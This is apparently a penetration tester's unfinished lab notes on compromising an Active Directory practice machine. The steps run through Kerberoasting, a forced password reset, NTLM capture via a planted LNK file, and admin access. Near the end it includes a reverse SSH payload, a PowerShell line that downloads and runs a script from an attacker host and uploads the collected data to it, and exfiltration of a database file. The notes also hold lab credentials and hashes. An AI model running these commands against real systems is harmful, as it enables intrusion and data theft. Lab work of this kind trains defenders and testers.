---
tags:
  - Lab
  - HackSmarter
MachineName: BuildingMagicAD
TargetIP: 10.1.176.13
Username: r.widdleton
Password: lilronron
Domain_Local: buildingmagic.local
Domain: buildingmagic
---

## BuildingMagicAD - Lab Machine
resources: [RustScan](https://github.com/RustScan/RustScan), [feroxbuster](https://github.com/epi052/feroxbuster), [nikto](https://github.com/sullo/nikto), [ffuf](https://github.com/ffuf/ffuf), [nmap](https://github.com/nmap/nmap), [SecLists](https://github.com/danielmiessler/SecLists), [authfinder](https://github.com/Real-Fruit-Snacks/authfinder), [nxc_enum](https://github.com/Real-Fruit-Snacks/nxc_enum)
### Machine Info
> - **Platform**: HackSmarter
> - **Difficulty**: Easy
> - **OS**: Windows
> - **IP Address**: 10.1.176.13
> - **Date Started**: 01-29-2026
> - **Date Completed**:
> - **User Flag**:
> - **Root Flag**:

### Scenario Description
> [!Info] 
> **Objective:** As a penetration tester on the Hack Smarter Red Team, your objective is to achieve a full compromise of the Active Directory environment.
> **Initial Access:** A prior enumeration phase has yielded a leaked database containing user credentials (usernames and hashed passwords). This information will serve as your starting point for gaining initial access to the network.
> **Execution:** Your task is to leverage the compromised credentials to escalate privileges, move laterally through the Active Directory, and ultimately achieve a complete compromise of the domain.
### Provided Credentials

#### Leaked Database

```text
id	username	full_name	role		password
1	r.widdleton	Ron Widdleton	Intern Builder	c4a21c4d438819d73d24851e7966229c
2	n.bottomsworth	Neville Bottomsworth Plannner	61ee643c5043eadbcdc6c9d1e3ebd298
3	l.layman	Luna Layman	Planner		8960516f904051176cc5ef67869de88f
4	c.smith		Chen Smith	Builder		bbd151e24516a48790b2cd5845e7f148
5	d.thomas	Dean Thomas	Builder		4d14ff3e264f6a9891aa6cea1cfa17cb
6	s.winnigan	Samuel Winnigan	HR Manager	078576a0569f4e0b758aedf650cb6d9a
7	p.jackson	Parvati Jackson	Shift Lead	eada74b2fa7f5e142ac412d767831b54
8	b.builder	Bob Builder	Electrician	dd4137bab3b52b55f99f18b7cd595448
9	t.ren		Theodore Ren	Safety Officer	bfaf794a81438488e57ee3954c27cd75
10	e.macmillan	Ernest Macmillan Surveyor	47d23284395f618bea1959e710bc68ef
```
#### Hashes from Leaked Database

```text
c4a21c4d438819d73d24851e7966229c
61ee643c5043eadbcdc6c9d1e3ebd298
8960516f904051176cc5ef67869de88f
bbd151e24516a48790b2cd5845e7f148
4d14ff3e264f6a9891aa6cea1cfa17cb
078576a0569f4e0b758aedf650cb6d9a
eada74b2fa7f5e142ac412d767831b54
dd4137bab3b52b55f99f18b7cd595448
bfaf794a81438488e57ee3954c27cd75
47d23284395f618bea1959e710bc68ef
```
#### Usernames from Leaked Database
```bash
r.widdleton
n.bottomsworth
l.layman
c.smith
d.thomas
s.winnigan
p.jackson
b.builder
t.ren
e.macmillan
```

> [!Important] Cracked Password `c4a21c4d438819d73d24851e7966229c:lilronron` for user `r.widdleton`
### Create Directory Structure

```bash
WD=/root/machines/BuildingMagicAD/10.1.176.13 && mkdir -p $WD/{logs,web,scan,nxc,exploit,bloodhound,loot,privesc,www} && cd $WD && touch usernames passwords confirmedCreds notes && ls -latr
```

### Launch Logged Terminal Tabs

```bash
WD=/root/machines/BuildingMagicAD/10.1.176.13 && TS=$(date +%Y%m%d_%H%M) && xfce4-terminal --maximize --hide-menubar --hide-toolbar --working-directory=$WD/ --title="Shell" -e "script -q -f $WD/logs/shell_$TS.log" --tab --working-directory=$WD/scan --title="Scan" -e "script -q -f $WD/logs/scan_$TS.log -c 'rustscan -a 10.1.176.13 --ulimit 5000 -b 1500 -- -sC -sV -Pn -oN $WD/scan/tcp.txt; exec bash'" --tab --working-directory=$WD/nxc --title="NXC" -e "script -q -f $WD/logs/nxc_$TS.log" --tab --working-directory=$WD/web --title="Web" -e "script -q -f $WD/logs/web_$TS.log" --tab --working-directory=$WD/exploit --title="Exploit" -e "script -q -f $WD/logs/exploit_$TS.log" --tab --working-directory=$WD/ --title="Notes"
```

### Maximize Terminal Window [optional]

```bash
wmctrl -r :ACTIVE: -b add,maximized_vert,maximized_horz
```

### Edit /etc/hosts
```bash
10.1.176.13 dc01.buildingmagic.local buildingmagic.local 
```
### Enumeration

#### RustScan TCP

```bash
rustscan -a 10.1.176.13 --ulimit 5000 -b 1500 -- -sC -sV -Pn -oN scan.txt
```

```text
# Output
Open 10.1.176.13:53
Open 10.1.176.13:88
Open 10.1.176.13:80
Open 10.1.176.13:135
Open 10.1.176.13:139
Open 10.1.176.13:389
Open 10.1.176.13:445
Open 10.1.176.13:464
Open 10.1.176.13:593
Open 10.1.176.13:3269
Open 10.1.176.13:3268
Open 10.1.176.13:3389
Open 10.1.176.13:5985
Open 10.1.176.13:8080
Open 10.1.176.13:9389
Open 10.1.176.13:49664
Open 10.1.176.13:49670
Open 10.1.176.13:49677
Open 10.1.176.13:49676
Open 10.1.176.13:49713
Open 10.1.176.13:49849

PORT      STATE    SERVICE          REASON          VERSION
53/tcp    filtered domain           no-response
80/tcp    filtered http             no-response
88/tcp    filtered kerberos-sec     no-response
135/tcp   filtered msrpc            no-response
139/tcp   filtered netbios-ssn      no-response
389/tcp   filtered ldap             no-response
445/tcp   filtered microsoft-ds     no-response
464/tcp   filtered kpasswd5         no-response
593/tcp   open     ncacn_http       syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open     ldap             syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: BUILDINGMAGIC.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  filtered globalcatLDAPssl no-response
3389/tcp  filtered ms-wbt-server    no-response
5985/tcp  filtered wsman            no-response
8080/tcp  filtered http-proxy       no-response
9389/tcp  filtered adws             no-response
49664/tcp filtered unknown          no-response
49670/tcp filtered unknown          no-response
49676/tcp open     ncacn_http       syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49677/tcp filtered unknown          no-response
49713/tcp filtered unknown          no-response
49849/tcp filtered unknown          no-response
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Nmap UDP

```bash
nmap -sU --top-ports 20 -sV 10.1.176.13 -oN udp_scan.txt
```

```text
# Output

```

#### authfinder

```bash
cd /opt/authfinder && python3 authfinder.py 10.1.176.13 'r.widdleton' 'lilronron' --domain buildingmagic
```

```text
# Output
Target           Username         Password             Service      Result
──────────────── ──────────────── ──────────────────── ──────────── ────────────
10.1.176.13      r.widdleton      lilronron            smbexec      Auth
10.1.176.13      r.widdleton      lilronron            wmi          Auth
10.1.176.13      r.widdleton      lilronron            psexec       Auth
10.1.176.13      r.widdleton      lilronron            atexec       Auth
10.1.176.13      r.widdleton      lilronron            rdp          Auth
10.1.176.13      r.widdleton      lilronron            ldap         Auth
10.1.176.13      r.widdleton      lilronron            kerberos     Auth
```

#### nxc_enum

```bash
cd /opt/nxc_enum && python -m nxc_enum 10.1.176.13 -u 'r.widdleton' -p 'lilronron' -A --copy-paste -o /root/machines/BuildingMagicAD/10.1.176.13/nxc/nxc_enum_results.txt
```

```text
# Output
[+] Target is a Domain Controller
  Hostname:        DC01
  FQDN:            DC01.BUILDINGMAGIC.LOCAL
  NetBIOS Domain:  BUILDINGMAGIC
  DNS Domain:      BUILDINGMAGIC.LOCAL
  Domain SID:      S-1-5-21-934388623-3731635803-3176817623

  OS: Windows Server 2022 Build 20348 x64
  OS version: '2022'
  Architecture: x64
  OS build: '20348'

Built-in Accounts (3)
RID     Username                Description
------  ----------------------  ----------------------------------------
500     Administrator           Built-in account for administering th...
501     Guest                   account for guest access to the compu...
502     krbtgt                  Key Distribution Center Service Account

Computer Accounts (1)
RID     Username                Description
------  ----------------------  ----------------------------------------
1000    DC01$                   

Standard Users (5)
RID     Username                Description
------  ----------------------  ----------------------------------------
1104    h.potch                 
1111    r.widdleton             
1112    r.haggard               
1113    h.grangon               
1115    a.flatch                Project Manager

RDP CONFIGURATION
--------------------------------------------------
  [+] RDP: Enabled
  [*] Hostname: DC01
  [+] NLA: Required
      Network Level Authentication protects against some attacks


```

> [!Important] From `nxc_enum`:  KERBEROASTABLE ACCOUNTS (have SPNs)

```bash
============================================================
  KERBEROASTABLE ACCOUNTS (have SPNs)
  Service tickets can be requested and cracked offline!
============================================================

  >>> r.haggard <<<
      SPN: HOGWARTS-DC/r.hagrid.WIZARDING.THM:60111

============================================================

GET THE HASHES:
  nxc ldap 10.1.176.13 -u 'r.widdleton' -p 'lilronron' -d 'BUILDINGMAGIC.LOCAL' --kerberoasting hashes.txt

CRACK WITH:
  hashcat -m 13100 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
  john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
```
### Kerberoasting
```bash
nxc ldap 10.1.176.13 -u 'r.widdleton' -p 'lilronron' -d 'BUILDINGMAGIC.LOCAL' --kerberoasting hashes.txt
```

```bash
$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$BUILDINGMAGIC.LOCAL\r.haggard*$979b94993987616bbcc6cb43dba8cd77$3ff17f2a406a37b56368827d0b0ac03a94c47310e4ad7f0172f77bf387bd6d695cd4be17e50f64b919046b39a77ae471b6dea7c8f7c41a0f2558ec126740accd0725f4bb5302a01fc8ade8b17b6e3a675459b42a060dc864fbcc7c8dd3b064c6f9c8802d101916ea53fcec429c36b9cb41e44c214600dfb2881e956375f8049318c969e25a39243f729f66384ff6ce21b96871f6d8941af1a0d83fe4b8e62dd65b6a2b879e2b8ebc41b5db1fa233126f162a91ab09f056d4ee9361795aee80ec7a1a9d496d90bad75f8d8cca26e0f9aa4533e2ec4dadaf2fdb5bf4b2ab3905a8546bc6b23549bf9a792c0e52f2136e3182b70fddf0d273ad48ac420a8a8732a5c1c886d70b54b53ceb81a4d155af7be90388973076cfb839768b24915681ff6200eaa6ca5f2aacc0511bfb77ad71cd3f152ad309d2286402893e5ef213491c996bda8ae841b0c984f42decd618cbc7f7c040f5d2bf740be81e97d0e329ebbb6b5173802f391e292a1a18c687ccea6a20e867b7c0627ce6e64f6aa782d8272911be86b30b26833a0c82d0fa026dd192fa4001de1dbd55926253a0ea1d526a5baaea938ab1a6ed2d812297d0a1ade92449e714719bbab7f1b8c9cfd07540e18953cdc83b75a5cf102a45f7fdc0aa4381db3fd5079327b4ff82df502f7f8cfd3e5644bf936febe6b64090638634b691ff6dfddaa2429148a973b51d63716c7291bb2dd59040a882f290e4dba0a044a5d31f776eb5a2ceb52f0196207fde22fef6686ea90c8c646e1074ccbd770efd5e77ec8ffc7d4f0f4f156859ac979eaf531488f7a243cf3d4fbe6a6fbe7c29f2dc1766771210a5e2276b8f49aef331bb525026061c6a25da005272225ffd2ec006ee4c627de68647934cce198d69cee37c6af29bef8ae895fecc5952dcc632d229289056d43199f6143ac539691415989d6ed69bdf99f9efa5a670bbeb521e1eace0e798c49c39a4242575bbc78a01d3de92d84b299f345583ffead7a97436f82fc00118a31bd13135eb1581b6a951335a6956461ce0cd28eaf239e99cabda98213b3c656de0946348af688f67b968d1be7ec61fcc3a566f3826970d69bcebfa1bce21767a3f6bbb4051f8d715a060da2221649f624e0f90b92839061ca2ec8e1a57d0c483e4c63b3fdf31f7d325376f879bef0b50fbbe0f2797b7ebc16f1be25b4e7defbb0fe88a3ac55c6c8ba7a9016dac23560dc550f69dba1cb43cef5950b81169d6838fac040a5d64e68cab9cfdb736ba60cd098ba83c7eb2031ec135ed72ccdd5b05d9d7eae18ac04797c0bd65394ea21479bd93a0dcfd6d584ec4140647e7a9742b4f955fd67b9813f5f73a5e114365d3b1198193bc5909d629528d8a782959ce472076a92f7e3b4cc7e9a48723d38e53b505ebd27c833a706e087ea086b29dc141ad9f522aa17d5e0b2090a57df15bde5b73ee74c395e7fc489a132710e34f75ad96165b28f1f675a2dd0dbb8381a3c07af2ddc3817201811354a27b6c4e116c94a7101084be40342e2ff8b2f7e83f639818f115736ccce4f9e86eb728cd
```
#### Cracking Hash
```bash
sudo hashcat -m 13100 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

```bash
rubeushagrid
```

> [!Important] Cracked Hash for `r.haggard` is `rubeushagrid`
### authfinder
```bash
cd /opt/authfinder && python3 authfinder.py 10.1.176.13 'r.haggard' 'rubeushagrid' --domain buildingmagic
```

```bash
Target           Username         Password             Service      Result
──────────────── ──────────────── ──────────────────── ──────────── ────────────
10.1.176.13      r.haggard        rubeushagrid         smbexec      Auth
10.1.176.13      r.haggard        rubeushagrid         wmi          Auth
10.1.176.13      r.haggard        rubeushagrid         psexec       Auth
10.1.176.13      r.haggard        rubeushagrid         atexec       Auth
10.1.176.13      r.haggard        rubeushagrid         rdp          Auth
10.1.176.13      r.haggard        rubeushagrid         ldap         Auth
10.1.176.13      r.haggard        rubeushagrid         kerberos     Auth
```
### nxc_enum

```bash
cd /opt/nxc_enum && python -m nxc_enum 10.1.176.13 -u 'r.haggard' -p 'rubeushagrid' -A --copy-paste -o /root/machines/BuildingMagicAD/10.1.176.13/nxc/r.haggard_nxc_enum_results.txt
```

```bash
# Output
MEDIUM PRIORITY (3)
------------------------------------------------------------
bloodhound-ce-python -u 'r.haggard' -p 'rubeushagrid' -d BUILDINGMAGIC.LOCAL -dc DC01.BUILDINGMAGIC.LOCAL -ns 10.1.176.13 -c All --zip
```

### Bloodhound
```bash
bloodhound-ce-python -u 'r.haggard' -p 'rubeushagrid' -d BUILDINGMAGIC.LOCAL -dc DC01.BUILDINGMAGIC.LOCAL -ns 10.1.176.13 -c All --zip
```

```bash
# Output
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: buildingmagic.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.BUILDINGMAGIC.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.BUILDINGMAGIC.LOCAL
INFO: Found 9 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Connecting to GC LDAP server: dc01.buildingmagic.local
WARNING: Could not resolve GPO link to CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=WIZARDING,DC=THM
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
WARNING: Could not resolve GPO link to cn={16B4CBF5-F6BE-49AA-98C9-F0A424DFB2C4},cn=policies,cn=system,DC=WIZARDING,DC=THM
WARNING: Could not resolve GPO link to CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=WIZARDING,DC=THM
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BUILDINGMAGIC.LOCAL
INFO: Done in 00M 05S
INFO: Compressing output into 20260129203650_bloodhound.zip
```

> [!Important] Forgot Bloodhound-CE password so need to reset it

```bash
 curl -L https://ghst.ly/getbhce | docker compose -f - down -v
```
### Install Bloodhound-ce with Docker Compose
```bash
curl -L https://ghst.ly/getbhce | docker compose -f - up
```

> [!Important] Password `frIREW6t_eyKulCRp3Es1bhCpK90CRGN` reset to `1qaz@WSX3edc$RFV`

> [!Info] 
> Key: `eAozdFKxcGnz3Y55yjh/udcOh5qpbFhJMTY4foCWz1xoITkS+xob9A==`
> ID: `75bd0ce8-3e33-4bee-b911-18cca949f119`
### Access Web UI [Local]
> [!info] Default credentials: `admin` / (random password from install logs). You'll be prompted to change it.

```text
http://localhost:8080/ui/login
```

> [!Info] Uploaded Zip from `bloodhound-ce-python`
### Install Hackles
```bash
cd /opt/
git clone https://github.com/Real-Fruit-Snacks/hackles.git
cd hackles
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### Authenticate with BloodHound API
> First-time setup only. Provides API ID and Key from BloodHound CE.

```bash
python -m hackles --auth
```

### Check Import Status
```bash
python -m hackles --ingest-history
```

```bash
# Output
[*] Ingest History (1 job(s)):

+----+----------+---------------------+---------------------+----------+
| ID | Status   | Start Time          | End Time            | Message  |
+----+----------+---------------------+---------------------+----------+
| 1  | Complete | 2026-01-30 01:55:37 | 2026-01-30 01:56:37 | Complete |
+----+----------+---------------------+---------------------+----------+
```
### Get User Information for Owned Command
```bash
python -m hackles -u neo4j -p 'bloodhoundcommunityedition' --investigate '*@*'
```

```bash
R.HAGGARD@BUILDINGMAGIC.LOCAL
R.WIDDLETON@BUILDINGMAGIC.LOCAL
```
### Set Users as Owned
```bash
python -m hackles -u neo4j -p 'bloodhoundcommunityedition' --own 'R.HAGGARD@BUILDINGMAGIC.LOCAL' --own 'R.WIDDLETON@BUILDINGMAGIC.LOCAL'
```

```bash
# Output
[*] Connecting to bolt://127.0.0.1:7687...
[+] Connected successfully
[+] Marked as owned: R.HAGGARD@BUILDINGMAGIC.LOCAL
[+] Marked as owned: R.WIDDLETON@BUILDINGMAGIC.LOCAL
```
### Investigate Users
```bash
python -m hackles -u neo4j -p 'bloodhoundcommunityedition' --investigate 'R.HAGGARD@BUILDINGMAGIC.LOCAL'
```
### Full Analysis Report
```bash
python -m hackles -u neo4j -p 'bloodhoundcommunityedition' -a -q --abuse
```

```bash
# Output
    Outbound Attack Edges (2)
+---------------------+----------------------------------+-------+
| Relationship        | Target                           | Type  |
+---------------------+----------------------------------+-------+
| ForceChangePassword | H.POTCH@BUILDINGMAGIC.LOCAL      | User  |
| MemberOf            | DOMAIN USERS@BUILDINGMAGIC.LOCAL | Group |
+---------------------+----------------------------------+-------+
```

> [!Important] User `R.HAGGARD`  has *ForceChangePassword* on `H.POTCH`
### Force Change Password on `H.POTCH`
```bash
bloodyAD -d BUILDINGMAGIC.LOCAL -u r.haggard -p 'rubeushagrid' --host 10.1.176.13 set password H.POTCH 'Passw0rd!2025'
```

```bash
[+] Password changed successfully!
```

### Mark user as Owned

```bash
mark owned H.POTCH@BUILDINGMAGIC.LOCAL
```

```bash
# Output
[*] Owned Principals
    Found 3 owned principal(s)
+-------------------------------------+------+---------+-------+
| Name                                | Type | Enabled | Admin |
+-------------------------------------+------+---------+-------+
| [!] H.POTCH@BUILDINGMAGIC.LOCAL     | User | True    | False |
| [!] R.HAGGARD@BUILDINGMAGIC.LOCAL   | User | True    | False |
| [!] R.WIDDLETON@BUILDINGMAGIC.LOCAL | User | True    | False |
+-------------------------------------+------+---------+-------+
```
### authfinder
```bash
cd /opt/authfinder && python3 authfinder.py 10.1.176.13 'h.potch' 'Passw0rd!2025' --domain buildingmagic
```

```bash

Target           Username         Password             Service      Result
──────────────── ──────────────── ──────────────────── ──────────── ────────────
10.1.176.13      h.potch          Passw0rd!2025        smbexec      Auth
10.1.176.13      h.potch          Passw0rd!2025        wmi          Auth
10.1.176.13      h.potch          Passw0rd!2025        psexec       Auth
10.1.176.13      h.potch          Passw0rd!2025        atexec       Auth
10.1.176.13      h.potch          Passw0rd!2025        rdp          Auth
10.1.176.13      h.potch          Passw0rd!2025        ldap         Auth
10.1.176.13      h.potch          Passw0rd!2025        kerberos     Auth
```
### nxc_enum

```bash
cd /opt/nxc_enum && python -m nxc_enum 10.1.176.13 -u 'h.potch' -p 'Passw0rd!2025' -A --copy-paste -o /root/machines/BuildingMagicAD/10.1.176.13/nxc/h.potch_nxc_enum_results.txt
```

```bash
# Output
ACCESSIBLE SHARES (4)
Share           Access       Comment
--------------- ------------ ------------------------------
File-Share      READ,WRITE   Central Repository of Build...
IPC$            READ         Remote IPC
NETLOGON        READ         Logon server share
SYSVOL          READ         Logon server share

NO ACCESS (2)
Share           Comment
--------------- ------------------------------
ADMIN$          Remote Admin
C$              Default share
```

> [!Important] `H.Potch` has *Write* Access to the File-Share

### Setup ntlm_theft
```bash
cd /opt/ && git clone https://github.com/Greenwolf/ntlm_theft
```

```bash
cd ntlm_theft && python3 -m venv ntlm_theft_venv && source ntlm_theft_venv/bin/activate
```

```bash
pip3 install xlsxwriter
```

### Generate Malicious Files
> Start Responder or ntlmrelayx first to capture the auth.

```bash
responder -I tun0
```

```bash
nxc smb 10.1.176.13 -u 'h.potch' -p 'Passw0rd!2025' -M slinky -o SERVER=10.200.25.138 NAME=payroll
```

```bash
# Output
[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         10.1.176.13     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.176.13     445    DC01             [+] BUILDINGMAGIC.LOCAL\h.potch:Passw0rd!2025
SMB         10.1.176.13     445    DC01             [*] Enumerated shares
SMB         10.1.176.13     445    DC01             Share           Permissions     Remark
SMB         10.1.176.13     445    DC01             -----           -----------     ------
SMB         10.1.176.13     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.176.13     445    DC01             C$                              Default share
SMB         10.1.176.13     445    DC01             File-Share      READ,WRITE      Central Repository of Building Magic's files.
SMB         10.1.176.13     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.176.13     445    DC01             NETLOGON        READ            Logon server share
SMB         10.1.176.13     445    DC01             SYSVOL          READ            Logon server share
SLINKY      10.1.176.13     445    DC01             [+] Found writable share: File-Share
SLINKY      10.1.176.13     445    DC01             [+] Created LNK file on the File-Share share

```

#### Responder Event Captured
```bash
h.grangon::BUILDINGMAGIC:7b2463a8a01bbe7d:9449534E573AEBE1AADF51B00D768889:010100000000000080F7486A6A91DC01E0B9FCA7295A9EEB00000000020008004800490044004E0001001E00570049004E002D004900350037005100450048003500460034004500300004003400570049004E002D00490035003700510045004800350046003400450030002E004800490044004E002E004C004F00430041004C00030014004800490044004E002E004C004F00430041004C00050014004800490044004E002E004C004F00430041004C000700080080F7486A6A91DC01060004000200000008003000300000000000000000000000004000005B20A9CE754E3CA78262C0A2A96FC0BE8B61E0831AAC51CC5546F3243D86E36F0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00320035002E003100330038000000000000000000
```
### Cracking Captured Hashes
#### NTLMv2 (hashcat mode 5600)
```bash
hashcat -m 5600 hashes.txt wordlist.txt -r best64.rule
```

```bash
# Output
magic4ever
```

> [!Important] Hash cracked for `h.grangon`, password: `magic4ever`

### Set user as Owned
```bash
mark owned H.GRANGON@BUILDINGMAGIC.LOCAL
```

> [!Important] `H.GRANGON@BUILDINGMAGIC.LOCAL` is an Admin
### authfinder
```bash
cd /opt/authfinder && python3 authfinder.py 10.1.176.13 'h.grangon' 'magic4ever' --domain buildingmagic
```

```bash
Target           Username         Password             Service      Result
──────────────── ──────────────── ──────────────────── ──────────── ────────────
10.1.176.13      h.grangon        magic4ever           winrm        Auth+Exec
10.1.176.13      h.grangon        magic4ever           smbexec      Auth Only
10.1.176.13      h.grangon        magic4ever           wmi          Auth Only
10.1.176.13      h.grangon        magic4ever           psexec       Auth Only
10.1.176.13      h.grangon        magic4ever           atexec       Auth Only
10.1.176.13      h.grangon        magic4ever           rdp          Auth Only
10.1.176.13      h.grangon        magic4ever           ldap         Auth
10.1.176.13      h.grangon        magic4ever           kerberos     Auth

```
### nxc_enum

```bash
cd /opt/nxc_enum && python -m nxc_enum 10.1.176.13 -p 'magic4ever' -u 'h.grangon' -A --copy-paste -o /root/machines/BuildingMagicAD/10.1.176.13/nxc/h.grangon_nxc_enum_results.txt
```

```bash
AdminCount=1 Accounts (4):
------------------------------
a.flatch
administrator
h.grangon
krbtgt
```


#### Impacket Shel

```bash
cd /opt/impacket-shell && python -m impacket_shell --target buildingmagic.local -u h.grangon -p 'magic4ever' -d buildingmagic -vv -A --log /root/machines/BuildingMagicAD/10.1.176.13/impacket_shell.txt
```

```text
# Output
winrm_shell
> cd Desktop
> type user.txt
```

### Upload RSSH
```bash
./build.sh reverse 10.200.25.138:443
```

```bash
[*] Build Configuration:
[*]   Mode:     reverse
[*]   Target:   reverse@10.200.25.138:443
[*]   BindPort: random (allocated by SSH server)
```

#### Execute RSSH
```bash
impacket(buildingmagic.local)> winrm rev2.exe
```

#### Connect to RSSH
```bash
ssh -MS /tmp/socket -p 44569 reverse@127.0.0.1
# c60295f82358181a
```
#### PowerShell Survey
```bash
cd /opt/powershellSurvey && ./serve-tools.sh
```

#### Latch.ps1

```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.200.25.138/Latch.ps1'); Invoke-Latch -Zip -Upload http://10.200.25.138:8000/upload -Cleanup"
```

```bash
# Output

```

### Interesting File
```bash
winrm_download C:\INETPUB\wwwroot\buildingmagic-app\backups\bm_employee_registry.db  /root/machines/BuildingMagicAD/10.1.176.13/registry.db
```

```bash
file 
```
### Web Enumeration [optional]

```bash
cd /root/machines/BuildingMagicAD/10.1.176.13/web
```

#### Directory Busting

```bash
feroxbuster -u http://10.1.176.13 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox.txt
```

```text
# Output

```

#### Vulnerability Scan

```bash
nikto -h http://10.1.176.13 -o nikto.txt
```

```text
# Output

```

#### Subdomain Enumeration [optional]

```bash
ffuf -u http://buildingmagic -H "Host: FUZZ.buildingmagic" -w /usr/share/seclists/Discovery/Web-Content/subdomains-top1million-5000.txt -fc 301,302 -o subs.txt
```

```text
# Output

```

### Initial Foothold
> Document how initial access was obtained.

### Privilege Escalation
> Document privesc path.

### Potential Credentials Discovered
#### Username

```text
r.widdleton
```

#### Password

```text
lilronron
```

#### Hash

```text
<NTHash>
```
### Credentials Discovered

#### Username

```text
r.widdleton
```

#### Password

```text
lilronron
```

#### Hash

```text
<NTHash>
```

### Lessons Learned
> Key takeaways and techniques to remember.
